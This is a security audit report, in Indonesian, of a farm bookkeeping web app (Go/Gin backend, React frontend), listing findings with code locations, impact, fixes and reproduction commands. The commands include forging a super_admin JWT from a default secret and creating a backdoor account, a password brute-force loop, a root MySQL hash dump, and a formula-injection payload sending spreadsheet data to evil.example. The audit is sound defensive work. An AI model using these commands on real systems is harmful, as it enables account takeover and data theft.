# Security Audit — Rejeki Baru Farm (Website Pembukuan Peternakan)

- **Tanggal audit:** 2026-10-25
- **Commit yang diaudit:** `b34512f` (branch `main`, satu-satunya commit)
- **Metode:** review manual seluruh source (65 file ter-track, semua dibaca), penelusuran alur data form → handler → SQL → response → render, ditambah `go vet ./...`, `govulncheck ./...` (via `go run golang.org/x/vuln/cmd/govulncheck@latest`) dan `npm audit`.
- **Mode:** read-only. Tidak ada file yang diubah selain pembuatan laporan ini. Database tidak disentuh.

---

## 0. Peta Sistem

### 0.1 Stack & versi

| Komponen | Teknologi | Versi |
|---|---|---|
| Backend | Go + Gin | go 1.26.0 (toolchain lokal `go1.26.0`), `gin v1.12.0` |
| DB driver | `database/sql` + `go-sql-driver/mysql` (tanpa ORM/GORM) | v1.10.1 |
| Auth | `golang-jwt/jwt/v5` (HS256), `golang.org/x/crypto/bcrypt` | v5.3.1, x/crypto v0.58.0 |
| Database | MySQL 8 (docker `mysql:8`) | — |
| Frontend | React + Vite (SPA murni, **bukan Next.js** — tidak ada API route / server action / middleware Next) | react 19.3.x, vite 8.3.x |

Catatan: `go.mod` menandai semua dependency sebagai `// indirect` (termasuk gin, jwt, mysql) — tidak berbahaya, tapi menandakan `go mod tidy` belum dijalankan.

### 0.2 Endpoint backend

Semua di bawah `/api`. Middleware global: `CORS` (`backend/internal/routes/routes.go:12`). `Auth()` = validasi JWT; `Akses(k)` = cek menu `k` milik user **dari database** setiap request; `Allow(r...)` = cek role **dari klaim JWT**.

| Method | Path | Middleware | Handler |
|---|---|---|---|
| POST | /api/login | — (publik) | `Login` |
| GET | /api/me | Auth | `Me` |
| GET/POST | /api/sapi | Auth, Akses(sapi) | `ListSapi` / `SaveSapi` |
| PUT/DELETE | /api/sapi/:id | Auth, Akses(sapi) | `SaveSapi` / `DelSapi` |
| GET/POST | /api/pakan | Auth, Akses(pakan) | `ListPakan` / `AddPakan` |
| DELETE | /api/pakan/:id | Auth, Akses(pakan) | `DelPakan` |
| GET | /api/pakan/stok | Auth, Akses(pakan) | `StokPakan` |
| GET/POST | /api/produksi | Auth, Akses(produksi) | `ListProduksi` / `SaveProduksi` |
| GET | /api/produksi/rekap | Auth, Akses(produksi) | `RekapProduksi` |
| GET/POST | /api/penjualan | Auth, Akses(penjualan) | `ListPenjualan` / `AddPenjualan` |
| DELETE | /api/penjualan/:id | Auth, Akses(penjualan) | `DelPenjualan` |
| GET/POST | /api/investor | Auth, Akses(investor) | `ListInvestor` / `SaveInvestor` |
| PUT/DELETE | /api/investor/:id | Auth, Akses(investor) | `SaveInvestor` / `DelInvestor` |
| GET/POST | /api/investor-bayar | Auth, Akses(investor) | `ListBayar` / `AddBayar` |
| DELETE | /api/investor-bayar/:id | Auth, Akses(investor) | `DelBayar` |
| GET/POST | /api/kas | Auth, Akses(kas) | `ListKas` / `AddKas` (kas kandang) |
| DELETE | /api/kas/:id | Auth, Akses(kas) | `DelKas` |
| GET/POST | /api/melk/susu | Auth, Akses(msusu) | `ListMelkSusu` / `AddSusuKeluar` |
| DELETE | /api/melk/susu/:id | Auth, Akses(msusu) | `DelMelkSusu` |
| GET/POST | /api/melk/keju | Auth, Akses(mkeju) | `ListMelkKeju` / `AddKeju` |
| DELETE | /api/melk/keju/:id | Auth, Akses(mkeju) | `DelKeju` |
| GET | /api/melk/rekap | Auth, Akses(mrekap) | `RekapMelk` |
| GET/POST | /api/melk/kas | Auth, Akses(mkas) | `ListKasMelk` / `AddKasMelk` |
| DELETE | /api/melk/kas/:id | Auth, Akses(mkas) | `DelKasMelk` |
| GET | /api/bo/ringkasan, /api/bo/labarugi | Auth, Akses(bo) | `BoRingkasan` / `BoLabaRugi` |
| GET/POST | /api/bo/kasawal | Auth, Akses(bokas) | `BoKasAwal` / `BoSetKasAwal` |
| GET/POST | /api/bo/kas | Auth, Akses(bokas) | `BoListKas` / `BoAddKas` |
| DELETE | /api/bo/kas/:id | Auth, Akses(bokas) | `BoDelKas` |
| GET | /api/bo/export | Auth, Allow(super_admin, owner), Akses(bo) | `BoExport` (CSV) |
| GET/POST | /api/users | Auth, Allow(super_admin) | `ListUsers` / `AddUser` |
| PUT | /api/users/:id/menus | Auth, Allow(super_admin) | `SetMenus` |
| DELETE | /api/users/:id | Auth, Allow(super_admin) | `DelUser` |

Setiap route terautentikasi dicek satu per satu: **tidak ada route data yang lupa diberi `Akses`/`Allow`**.

### 0.3 Frontend

SPA tanpa router URL; "halaman" dipilih via state (`frontend/src/App.jsx:10-17`), daftar di `frontend/src/config/menu.js`:
Login, Rekap Sapi, Stok Pakan, Produksi Susu, Penjualan Susu, Investor, Keuangan Kandang, Melk (Susu, Keju, Rekap 10 hari, Keuangan), Back Office (Rekap Keseluruhan, Keuangan BO), Pengaturan Akun. Semua request lewat `frontend/src/api/client.js`, token di `localStorage`.

### 0.4 Model data & role

Tabel (`backend/migrations/001_init_peternakan.sql`): `users`, `sapi`, `pakan_mutasi`, `produksi_susu`, `penjualan_susu`, `investor`, `melk_keju`, `melk_susu`, `kas` (satu tabel untuk 3 unit: kandang/melk/back_office, dengan `ref_tabel/ref_id` untuk catatan otomatis), `kas_awal_bo`. Kolom tambahan via `database.Migrate()`: `users.menus`, `melk_susu.ref_id`.
Tidak ada data kesehatan/vaksin/kelahiran terpisah (hanya `sapi.jumlah_anak`). **Single-tenant** (satu peternakan) — tidak ada `owner_id`/`farm_id`.

| Role | Menu default (`services/access.go:14-26`) | Bisa diubah super_admin? |
|---|---|---|
| super_admin | semua + kelola akun | Tidak (selalu semua) |
| owner | semua (termasuk export CSV) | Ya |
| peternakan | sapi, pakan, produksi, penjualan, investor, kas | Ya |
| melk | msusu, mkeju, mrekap, mkas | Ya |
| back_office | bo, bokas | Ya |

### 0.5 Import/export, upload, laporan

- Export: hanya `GET /api/bo/export` → CSV (laba rugi + transaksi kas), dibuat on-the-fly, tidak disimpan ke disk.
- "Cetak / simpan PDF" = `window.print()` di browser.
- **Tidak ada** upload file dan **tidak ada** import.

### 0.6 Konfigurasi & deployment

- `backend/internal/config/config.go` — env `DB_DSN`, `JWT_SECRET`, `PORT` dengan default hardcoded.
- `docker-compose.yml` — hanya MySQL (root/root, port 3306 dipublish).
- `frontend/.env.example` — hanya `VITE_API_URL`.
- **Tidak ditemukan:** Dockerfile backend/frontend, CI/CD, konfigurasi reverse proxy/HTTPS, skrip backup, `.gitignore` di root.

---

## 1. Ringkasan Eksekutif

Aplikasi berukuran kecil dan secara umum ditulis cukup disiplin: **semua query SQL memakai parameter** (tidak ada SQL injection yang ditemukan), password di-hash dengan bcrypt, algoritma JWT dikunci ke HS256, setiap endpoint data diproteksi pengecekan menu yang dibaca dari database, dan frontend tidak memakai `dangerouslySetInnerHTML`.

Risiko terbesar justru ada di **konfigurasi default dan kontrol akun**: JWT secret jatuh ke nilai default yang dipublikasikan di repo bila env lupa diisi (pemalsuan token super_admin), akun `admin/admin123` dibuat otomatis tanpa fitur ganti password, login tanpa pembatasan percobaan, dan MySQL `root/root` dipublish ke semua interface. Untuk aplikasi **pembukuan keuangan**, ketiadaan audit log ditambah hard delete membuat setiap staf bisa menghapus/mengubah catatan uang tanpa jejak.

| Severity | Jumlah |
|---|---|
| Critical | 1 |
| High | 4 |
| Medium | 6 |
| Low | 8 |
| Info | 3 |
| **Total** | **22** |

---

## 2. Tabel Ringkas

| ID | Judul | Severity | Lokasi |
|---|---|---|---|
| C-01 | JWT secret default `ganti-secret-ini` dipakai bila env kosong → pemalsuan token super_admin | Critical | `backend/internal/config/config.go:22`, `backend/main.go:14-16` |
| H-01 | Akun default `admin/admin123` + tidak ada fitur ganti password sama sekali | High | `backend/internal/services/auth.go:54-63` |
| H-02 | Login tanpa rate limit / lockout, kebijakan password lemah (min 6) | High | `backend/internal/routes/routes.go:13`, `backend/internal/controllers/user.go:37` |
| H-03 | MySQL `root/root`, port 3306 dipublish, aplikasi konek sebagai root | High | `docker-compose.yml:7-10`, `backend/internal/config/config.go:21` |
| H-04 | Tidak ada audit log; catatan keuangan bisa diubah/dihapus permanen tanpa jejak | High | semua handler `Del*`/`Save*`, mis. `backend/internal/controllers/investor.go:67-70` |
| M-01 | Token tidak bisa dicabut; `Allow()` percaya role di JWT → super_admin yang dihapus tetap bisa kelola akun 24 jam | Medium | `backend/internal/middleware/auth.go:27-37`, `backend/internal/routes/users.go:11` |
| M-02 | CSV/Formula injection pada export laporan | Medium | `backend/internal/controllers/backoffice.go:161` |
| M-03 | Error database diabaikan → respons `ok:true` padahal gagal; transaksi bisa commit sebagian | Medium | `backend/internal/controllers/kas_kandang.go:60-62`, `pakan.go:44-58`, dll. |
| M-04 | Validasi input backend lemah (tanggal, nilai negatif/ekstrem, relasi) | Medium | `sapi.go:33`, `investor.go:48,122`, `pakan.go:34`, dll. |
| M-05 | Batas antar-unit bocor: staf kandang bisa mengurangi saldo BO & menghapus data Melk | Medium (Perlu verifikasi) | `kas_kandang.go:53`, `penjualan.go:64-71`, `services/laporan.go:72` |
| M-06 | Toolchain Go usang: 26 vuln reachable (stdlib go1.26.0 + quic-go) | Medium | `backend/go.mod:3,29` |
| L-01 | CORS `Access-Control-Allow-Origin: *` | Low | `backend/internal/middleware/cors.go:6` |
| L-02 | Pesan error SQL internal dikirim ke klien | Low | `sapi.go:14` dan 12 handler lain |
| L-03 | Hardening Gin/HTTP: debug mode default, trust all proxies, tanpa timeout, tanpa batas body | Low | `backend/internal/routes/routes.go:11`, `backend/main.go:23` |
| L-04 | Token di `localStorage` + tidak ada CSP/security header | Low | `frontend/src/api/auth.js:14`, `frontend/index.html` |
| L-05 | Enumerasi username via perbedaan waktu login | Low | `backend/internal/services/auth.go:41-44` |
| L-06 | Header `Content-Disposition` dibangun dari query tak tervalidasi | Low | `backend/internal/controllers/backoffice.go:15-24,132` |
| L-07 | Error bcrypt diabaikan (password >72 byte → hash kosong); cost 10 | Low | `backend/internal/controllers/user.go:41` |
| L-08 | Tidak ada `.gitignore` root; `.env` frontend tidak di-ignore | Low | root repo, `frontend/.gitignore` |
| I-01 | Password seed ditulis ke log; seed jalan ulang bila tabel users kosong | Info | `backend/internal/services/auth.go:56-62` |
| I-02 | Tidak ada konfigurasi backup, Dockerfile, CI, HTTPS | Info | — |
| I-03 | Tombol export disembunyikan berdasar role di `localStorage` (UI saja) | Info | `frontend/src/pages/backoffice/RekapBO.jsx:10,44` |

---

## 3. Detail Temuan

### C-01 — JWT secret default dipakai bila `JWT_SECRET` tidak diisi

**Severity: Critical** (kondisional pada deployment). Nilai default ada di repo publik/internal dan di README; bila server dijalankan tanpa env, siapa pun bisa membuat token super_admin. Aplikasi tetap jalan dan hanya mencetak peringatan.

**Lokasi:** `backend/internal/config/config.go:22`, `backend/main.go:14-16`, dipakai di `backend/internal/services/auth.go:15,25`

```go
// config.go:22
JWTSecret: get("JWT_SECRET", "ganti-secret-ini"),

// main.go:14-16
if cfg.JWTSecret == "ganti-secret-ini" {
    log.Println("PERINGATAN: JWT_SECRET belum diatur, isi dengan nilai acak sebelum dipakai di server")
}
```

**Dampak:** penyerang memalsukan JWT `{"u":"admin","r":"super_admin"}` → akses penuh ke semua data keuangan, investor, dan manajemen akun (membuat akun super_admin baru untuk persistensi). Untuk route `/api/users` hanya klaim `r` yang dicek (lihat M-01), jadi `u` bahkan tidak perlu username yang valid; untuk route lain `u` harus username yang ada (`admin` ada secara default).

**Reproduksi:**
```bash
TOKEN=$(python -c "import jwt,time;print(jwt.encode({'u':'admin','r':'super_admin','exp':int(time.time())+3600},'ganti-secret-ini',algorithm='HS256'))")
curl -H "Authorization: Bearer $TOKEN" https://TARGET/api/users
curl -X POST -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"username":"backdoor","password":"P4ssw0rd!","role":"super_admin"}' https://TARGET/api/users
```

**Rekomendasi:** gagal-start bila secret kosong/default/pendek.
```go
// config.go
JWTSecret: os.Getenv("JWT_SECRET"),

// main.go
if len(cfg.JWTSecret) < 32 || cfg.JWTSecret == "ganti-secret-ini" {
    log.Fatal("JWT_SECRET wajib diisi minimal 32 karakter acak (mis. `openssl rand -base64 48`)")
}
```

---

### H-01 — Akun default `admin/admin123` dan tidak ada fitur ganti password

**Severity: High.** Kredensial default terdokumentasi di README dan log; aplikasi tidak menyediakan endpoint ganti password untuk siapa pun (cek semua route di §0.2 — tidak ada). Satu-satunya mitigasi adalah membuat akun baru lalu menghapus `admin` secara manual, yang mudah terlupa. User biasa juga tidak bisa mengganti password yang bocor.

**Lokasi:** `backend/internal/services/auth.go:54-63`, `README.md:36`

```go
h, _ := bcrypt.GenerateFromPassword([]byte("admin123"), 10)
database.DB.Exec("INSERT INTO users (username,password_hash,role) VALUES ('admin',?,'super_admin')", string(h))
log.Println("User awal dibuat: admin / admin123 (segera ganti)")
```

**Dampak:** takeover super_admin pada deployment yang belum dibersihkan; dikombinasikan dengan H-02 tanpa hambatan.

**Reproduksi:**
```bash
curl -X POST https://TARGET/api/login -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"admin123"}'
```

**Rekomendasi:**
- Ambil password awal dari env (`ADMIN_INITIAL_PASSWORD`) atau generate acak dan tampilkan sekali; tambahkan kolom `must_change_password`.
- Tambahkan endpoint `PUT /api/me/password` (wajib password lama) dan `PUT /api/users/:id/password` (super_admin reset).
```go
func ChangePassword(c *gin.Context) {
    var in struct{ Old, New string }
    if c.BindJSON(&in) != nil { return }
    if len(in.New) < 12 || len(in.New) > 72 { c.JSON(400, gin.H{"error": "Password 12-72 karakter"}); return }
    var hash string
    database.DB.QueryRow("SELECT password_hash FROM users WHERE username=?", c.GetString("username")).Scan(&hash)
    if bcrypt.CompareHashAndPassword([]byte(hash), []byte(in.Old)) != nil { c.JSON(400, gin.H{"error": "Password lama salah"}); return }
    h, err := bcrypt.GenerateFromPassword([]byte(in.New), 12)
    if err != nil { c.JSON(500, gin.H{"error": "Gagal"}); return }
    database.DB.Exec("UPDATE users SET password_hash=?, token_version=token_version+1 WHERE username=?", h, c.GetString("username"))
    c.JSON(200, gin.H{"ok": true})
}
```

---

### H-02 — Login tanpa rate limiting / lockout; kebijakan password lemah

**Severity: High.** Endpoint publik, tanpa batas percobaan, tanpa delay, tanpa captcha, tanpa log kegagalan. Password minimal hanya 6 karakter.

**Lokasi:** `backend/internal/routes/routes.go:13`, `backend/internal/controllers/auth.go:9-20`, `backend/internal/controllers/user.go:37`

```go
r.POST("/api/login", controllers.Login)
...
if in.Username == "" || len(in.Password) < 6 || !valid[in.Role] {
```

**Dampak:** brute force/credential stuffing online. Satu-satunya pembatas adalah biaya bcrypt (cost 10 ≈ puluhan ms/percobaan), cukup untuk ribuan percobaan per menit dari satu klien paralel — password 6 karakter umum akan jatuh. Juga membuka DoS CPU (setiap percobaan dengan username valid menjalankan bcrypt).

**Reproduksi:**
```bash
for p in $(cat wordlist.txt); do
  curl -s -o /dev/null -w "%{http_code} $p\n" -X POST https://TARGET/api/login \
    -H 'Content-Type: application/json' -d "{\"username\":\"admin\",\"password\":\"$p\"}"
done | grep ^200
```

**Rekomendasi:** rate limit per IP + per username, lockout bertahap, log kegagalan, password minimal 10-12.
```go
// contoh sederhana dengan golang.org/x/time/rate per IP
var limiters sync.Map
func LoginLimit() gin.HandlerFunc {
    return func(c *gin.Context) {
        v, _ := limiters.LoadOrStore(c.ClientIP(), rate.NewLimiter(rate.Every(12*time.Second), 5))
        if !v.(*rate.Limiter).Allow() {
            c.AbortWithStatusJSON(429, gin.H{"error": "Terlalu banyak percobaan, coba lagi nanti"})
            return
        }
        c.Next()
    }
}
// r.POST("/api/login", middleware.LoginLimit(), controllers.Login)
```
(Pastikan `SetTrustedProxies` benar agar `ClientIP()` tidak bisa dipalsukan — lihat L-03.)

---

### H-03 — MySQL `root/root` dipublish ke semua interface, aplikasi memakai root

**Severity: High** bila compose ini dipakai di server (README hanya menyebut "development", tapi tidak ada konfigurasi produksi lain).

**Lokasi:** `docker-compose.yml:7-10`, `backend/internal/config/config.go:21`

```yaml
environment:
  MYSQL_ROOT_PASSWORD: root
  MYSQL_DATABASE: rejeki
ports:
  - "3306:3306"
```
```go
DSN: get("DB_DSN", "root:root@tcp(127.0.0.1:3306)/rejeki"),
```

**Dampak:** `3306:3306` bind ke `0.0.0.0`; Docker menulis aturan iptables sendiri sehingga sering **melewati firewall UFW**. Siapa pun di internet bisa login sebagai root MySQL → baca/ubah/hapus seluruh data, ganti `password_hash` admin. Aplikasi yang memakai root juga berarti satu bug di aplikasi = kontrol penuh server DB (mis. `DROP DATABASE`, `SELECT ... INTO OUTFILE`).

**Reproduksi:** `mysql -h TARGET -P 3306 -uroot -proot rejeki -e "SELECT username,password_hash FROM users"`

**Rekomendasi:**
```yaml
services:
  db:
    image: mysql:8.4
    environment:
      MYSQL_ROOT_PASSWORD_FILE: /run/secrets/db_root
      MYSQL_DATABASE: rejeki
      MYSQL_USER: rejeki_app
      MYSQL_PASSWORD_FILE: /run/secrets/db_app
    ports:
      - "127.0.0.1:3306:3306"   # atau hapus sama sekali bila backend di network compose yang sama
    secrets: [db_root, db_app]
```
Berikan user aplikasi hanya `SELECT, INSERT, UPDATE, DELETE` (+`ALTER` sementara selama `Migrate()` masih ada) pada `rejeki.*`. Hapus default DSN dari kode (wajib dari env).

---

### H-04 — Tidak ada audit log; catatan keuangan bisa diubah/dihapus permanen tanpa jejak

**Severity: High** (untuk sistem pembukuan, ini risiko fraud/repudiation langsung).

**Lokasi (contoh):**
- Hard delete: `sapi.go:53`, `pakan.go:62-68`, `penjualan.go:64-71`, `investor.go:82-89,131-134`, `kas_kandang.go:65-71`, `melk_*.go Del*`, `backoffice.go:122-125`, `user.go:66`
- Update menimpa nilai lama tanpa riwayat: `investor.go:67-70`, `sapi.go:39-40`, `produksi.go:40-41` (`ON DUPLICATE KEY UPDATE`)

```go
// investor.go:67-70 — jumlah modal investor & kas terkait ditimpa begitu saja
tx.Exec("UPDATE investor SET nama=?,kontak=?,jumlah_invest=?,mulai=?,selesai=? WHERE id=?", ...)
tx.Exec("UPDATE kas SET tgl=?,jumlah=?,keterangan=? WHERE ref_tabel='investor_modal' AND ref_id=?", ...)

// backoffice.go:123
database.DB.Exec("DELETE FROM kas WHERE id=? AND unit='back_office'", c.Param("id"))
```

Tidak ada kolom `created_by`, `updated_by`, `created_at` (kecuali `users`/`sapi`), `deleted_at`, maupun tabel log. Username pelaku tersedia di `c.GetString("username")` tapi tidak pernah disimpan.

**Dampak:** staf dengan menu `kas`/`investor`/`bokas` bisa mencatat pengeluaran fiktif lalu menghapusnya, mengubah jumlah modal investor, atau menghapus pembayaran investor — tanpa ada cara mengetahui siapa, kapan, dan nilai sebelumnya. Data yang dihapus hilang permanen (tidak ada backup — I-02).

**Reproduksi:**
```bash
curl -X DELETE -H "Authorization: Bearer $TOKEN_PETERNAKAN" https://TARGET/api/investor-bayar/15
curl -X PUT -H "Authorization: Bearer $TOKEN_PETERNAKAN" -H 'Content-Type: application/json' \
  -d '{"nama":"Pak X","jumlah_invest":1,"mulai":"2026-01-01","selesai":"2027-01-01"}' https://TARGET/api/investor/3
```

**Rekomendasi:**
```sql
CREATE TABLE audit_log (
  id BIGINT AUTO_INCREMENT PRIMARY KEY,
  at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  username VARCHAR(50) NOT NULL,
  aksi ENUM('create','update','delete') NOT NULL,
  tabel VARCHAR(30) NOT NULL,
  row_id BIGINT NOT NULL,
  sebelum JSON NULL,
  sesudah JSON NULL
);
ALTER TABLE kas ADD COLUMN created_by VARCHAR(50), ADD COLUMN created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                ADD COLUMN deleted_at TIMESTAMP NULL, ADD COLUMN deleted_by VARCHAR(50);
```
```go
// di dalam tx yang sama dengan perubahan
func audit(tx *sql.Tx, c *gin.Context, aksi, tabel string, id any, before, after any) error {
    b, _ := json.Marshal(before); a, _ := json.Marshal(after)
    _, err := tx.Exec("INSERT INTO audit_log (username,aksi,tabel,row_id,sebelum,sesudah) VALUES (?,?,?,?,?,?)",
        c.GetString("username"), aksi, tabel, id, nullJSON(b), nullJSON(a))
    return err
}
```
Pertimbangkan soft delete (`deleted_at`) untuk tabel keuangan, dan batasi hapus/edit catatan bulan yang sudah ditutup ("tutup buku") hanya untuk owner.

---

### M-01 — Token tidak bisa dicabut; `Allow()` mempercayai role di klaim JWT

**Severity: Medium.**

**Lokasi:** `backend/internal/middleware/auth.go:12-37`, `backend/internal/services/auth.go:17-22`, `backend/internal/routes/users.go:11`, `backend/internal/routes/backoffice.go:20`, `frontend/src/App.jsx:18`

```go
// services/auth.go — token 24 jam, tanpa jti/versi
"u": username, "r": role, "exp": time.Now().Add(24 * time.Hour).Unix(),

// middleware/auth.go — Allow memakai role dari token, bukan dari DB
if c.GetString("role") == r {
```

`Akses()` membaca menu dari DB setiap request (baik — user yang dihapus otomatis kehilangan akses route data), tetapi `Allow()` hanya mengecek role yang tertanam di token. Logout di frontend hanya `localStorage.clear()`; token tetap valid di server.

**Dampak:**
1. super_admin yang **dihapus** (mis. karyawan keluar) tetap bisa memanggil `/api/users` selama sisa masa token (≤24 jam) → membuat akun super_admin baru untuk dirinya sendiri (persistensi permanen).
2. Username dipakai ulang: hapus `budi` (super_admin) lalu buat `budi` baru sebagai `peternakan` → token lama `budi` masih berklaim `super_admin`.
3. Token yang dicuri tidak bisa dibatalkan (tidak ada fitur ganti password juga — H-01).

**Reproduksi:**
1. Login sebagai super_admin `ops`, simpan token.
2. Super_admin lain menghapus `ops`.
3. `curl -H "Authorization: Bearer $TOKEN_OPS" https://TARGET/api/users` → 200; `POST /api/users` membuat akun baru → 200.

**Rekomendasi:** ambil role dari DB di `Auth()` dan gunakan versi token.
```go
func Auth() gin.HandlerFunc {
    return func(c *gin.Context) {
        username, ver, ok := services.ParseToken(strings.TrimPrefix(c.GetHeader("Authorization"), "Bearer "))
        if !ok { c.AbortWithStatusJSON(401, gin.H{"error": "Belum login"}); return }
        var role string; var dbVer int
        if database.DB.QueryRow("SELECT role, token_version FROM users WHERE username=?", username).Scan(&role, &dbVer) != nil || dbVer != ver {
            c.AbortWithStatusJSON(401, gin.H{"error": "Sesi tidak berlaku"}); return
        }
        c.Set("username", username); c.Set("role", role)
        c.Next()
    }
}
```
Naikkan `token_version` saat logout, ganti password, hapus/ubah akun. Perpendek expiry (mis. 8 jam) dan sertakan user `id` (bukan hanya username) di klaim.

---

### M-02 — CSV / Formula injection pada export laporan

**Severity: Medium.** File dibuka owner di Excel (sesuai label tombol "Unduh Excel (CSV)").

**Lokasi:** `backend/internal/controllers/backoffice.go:154-162` (sumber data dari input bebas: `kas_kandang.go:60`, `melk_kas.go:60`, `backoffice.go:117`, `investor.go:126` — field `keterangan`)

```go
rows.Scan(&tgl, &u, &a, &k, &j, &ket)
w.Write([]string{tgl, u, a, k, f(j), ket})   // ket langsung dari input user
```

`encoding/csv` hanya meng-quote, tidak menetralkan formula. Keterangan otomatis diawali teks tetap ("Beli ", "Jual susu ke ", "Modal investor ") sehingga aman; yang rentan adalah keterangan manual.

**Dampak:** staf peternakan/melk/BO menyisipkan formula yang dieksekusi di komputer owner: eksfiltrasi isi laporan via `HYPERLINK`/`WEBSERVICE`, atau (pada Excel lama/DDE aktif) eksekusi perintah.

**Reproduksi:**
```bash
curl -X POST -H "Authorization: Bearer $TOKEN_PETERNAKAN" -H 'Content-Type: application/json' \
  -d '{"tgl":"2026-10-01","arah":"keluar","kategori":"operasional","jumlah":1000,"keterangan":"=HYPERLINK(\"https://evil.example/?d=\"&A6&B6,\"Detail\")"}' \
  https://TARGET/api/kas
# lalu owner mengunduh /api/bo/export dan membukanya di Excel
```

**Rekomendasi:**
```go
func csvSafe(s string) string {
    if s != "" && strings.ContainsRune("=+-@\t\r", rune(s[0])) {
        return "'" + s
    }
    return s
}
// w.Write([]string{tgl, u, a, k, f(j), csvSafe(ket)})
```
Terapkan ke semua kolom teks bebas (termasuk `pembeli`, `nama` bila nanti ikut diexport).

---

### M-03 — Error database diabaikan; respons sukses palsu dan transaksi parsial

**Severity: Medium** (integritas data keuangan).

**Lokasi (contoh):**
- `backend/internal/controllers/kas_kandang.go:60-62`, `melk_kas.go:60-62`, `backoffice.go:61,117-119`, `investor.go:126-128` — `Exec` tanpa cek error lalu `ok:true`.
- `pakan.go:44,54-58`, `penjualan.go:45,53-60`, `melk_susu.go:45,53-55`, `melk_keju.go:49,63-66`, `investor.go:52,64-78,83-87` — `tx, _ := Begin()`; `tx.Exec` kedua dst. tidak dicek; `Commit()` tidak dicek.
- `user.go:15-16` — `rows, _ := Query(...)` lalu `defer rows.Close()` (nil → panic).
- `user.go:55`, `sapi.go:53`, `investor.go:132` — `UPDATE/DELETE` selalu `ok:true` walau id tidak ada.

```go
// penjualan.go:52-61
id, _ := res.LastInsertId()
tx.Exec(`INSERT INTO kas ...`, ...)          // error diabaikan
if in.Tujuan == "melk_rbf" {
    tx.Exec("INSERT INTO melk_susu ...", ...) // error diabaikan
    tx.Exec(`INSERT INTO kas ...`, ...)       // error diabaikan
}
tx.Commit()                                   // error diabaikan
c.JSON(200, gin.H{"ok": true})
```

**Dampak:** penjualan tercatat tanpa kas, atau susu Melk tanpa kas pasangan → saldo dan laba rugi salah tanpa terdeteksi. Pada MySQL strict mode, tanggal tidak valid (`"tgl":"abc"`) ditolak DB, tapi pengguna tetap melihat "berhasil". Jika `Begin()` gagal (pool habis), `tx` nil → panic (ditangkap Recovery Gin, 500).

**Reproduksi:** `curl -X POST .../api/kas -d '{"tgl":"2026-13-45","arah":"masuk","kategori":"kas","jumlah":5}'` → `{"ok":true}` tetapi tidak ada baris tersimpan.

**Rekomendasi:**
```go
func withTx(fn func(tx *sql.Tx) error) error {
    tx, err := database.DB.Begin()
    if err != nil { return err }
    if err := fn(tx); err != nil { tx.Rollback(); return err }
    return tx.Commit()
}
// setiap tx.Exec: if _, err := tx.Exec(...); err != nil { return err }
// setelah UPDATE/DELETE: cek RowsAffected()==0 → 404
```

---

### M-04 — Validasi input backend lemah

**Severity: Medium.** Frontend hanya memberi `min="0"` pada input HTML; backend adalah satu-satunya garis pertahanan dan banyak celah.

| Lokasi | Masalah |
|---|---|
| Semua handler (`Tgl == ""` saja) | Format/rentang tanggal tidak divalidasi: `1000-01-01`, `9999-12-31`, tanggal masa depan diterima. Pada server dengan `sql_mode` non-strict, tanggal invalid jadi `0000-00-00` (**Perlu verifikasi** `sql_mode` produksi). |
| `sapi.go:33` | `jumlah_anak` boleh negatif; `tgl_lahir` boleh masa depan; panjang `nomor`/`nama` tidak dibatasi. |
| `pakan.go:34` | Pakan `keluar` tidak dicek terhadap stok → stok negatif (`StokPakan`). `satuan` bebas teks; `harga_total` boleh negatif untuk `masuk` (tidak dicek `>= 0`) — akan jadi kas keluar 0 karena `> 0`, tapi `harga_total` negatif tetap tersimpan. |
| `investor.go:48` | `selesai` < `mulai` diterima; nomor sapi yang tidak ada diabaikan diam-diam. |
| `investor.go:122-127` | `investor_id` tidak dicek eksistensinya → kas keluar yatim (masuk saldo & laba rugi tapi tidak tampil di `ListBayar` karena `JOIN`). |
| `produksi.go:36`, `penjualan.go:40`, dll. | Tidak ada batas atas (liter, harga, jumlah). Batas hanya dari `DECIMAL(15,2)`. |
| `backoffice.go:15-24` | `dari`/`sampai` bebas string; tidak dicek urutan maupun format. |

**Dampak:** data operasional/keuangan tidak masuk akal, laporan menyesatkan, manipulasi saldo lewat nilai ekstrem.

**Reproduksi:**
```bash
curl -X POST .../api/sapi -d '{"nomor":"X1","nama":"x","tgl_lahir":"2099-01-01","jumlah_anak":-50,"status":"pedet"}'
curl -X POST .../api/investor-bayar -d '{"investor_id":999999,"tgl":"2026-10-01","jumlah":50000000}'
curl -X POST .../api/pakan -d '{"tgl":"2026-10-01","jenis":"rumput","arah":"keluar","jumlah":1e9}'
```

**Rekomendasi:** helper validasi terpusat.
```go
func validDate(s string) bool {
    t, err := time.Parse("2006-01-02", s)
    return err == nil && t.Year() >= 2000 && t.Before(time.Now().AddDate(0, 0, 1))
}
func validAmount(v, max float64) bool { return v > 0 && v <= max }
// SaveSapi: if s.JumlahAnak < 0 || s.JumlahAnak > 30 || len(s.Nama) > 100 { 400 }
// AddBayar: SELECT 1 FROM investor WHERE id=? sebelum insert
// AddPakan keluar: cek stok di dalam tx dengan SELECT ... FOR UPDATE
```
Set `sql_mode` strict secara eksplisit di DSN: `?sql_mode='STRICT_ALL_TABLES,NO_ZERO_DATE,NO_ZERO_IN_DATE'`.

---

### M-05 — Batas antar-unit keuangan bocor (Perlu verifikasi)

**Severity: Medium — Perlu verifikasi** apakah ini memang alur bisnis yang diinginkan.

**Lokasi:** `backend/internal/controllers/kas_kandang.go:53`, `backend/internal/services/laporan.go:72`, `backend/internal/controllers/penjualan.go:64-71`

```go
// kas_kandang.go:53 — staf kandang boleh mencatat "topup_bo"
"masuk":  {"kas": true, "topup_bo": true, "lainnya": true},

// laporan.go:72 — dan itu MENGURANGI saldo Back Office
database.DB.QueryRow(`SELECT IFNULL(SUM(jumlah),0) FROM kas WHERE unit='kandang' AND kategori='topup_bo' AND tgl>=?`, tgl).Scan(&topup)
return j + s - topup
```
```go
// penjualan.go:66-68 — staf kandang menghapus data milik unit Melk
tx.Exec("DELETE FROM kas WHERE ref_tabel='penjualan_susu' AND ref_id=?", c.Param("id"))
tx.Exec("DELETE FROM melk_susu WHERE ref_id=?", c.Param("id"))
```

**Dampak:** user dengan menu `kas` saja (role peternakan) dapat secara sepihak menurunkan saldo kas Back Office (top up "diterima" tanpa konfirmasi BO), menutupi selisih kas kandang. User dengan menu `penjualan` dapat menghapus pembelian susu dan kas keluar unit Melk.

**Reproduksi:**
```bash
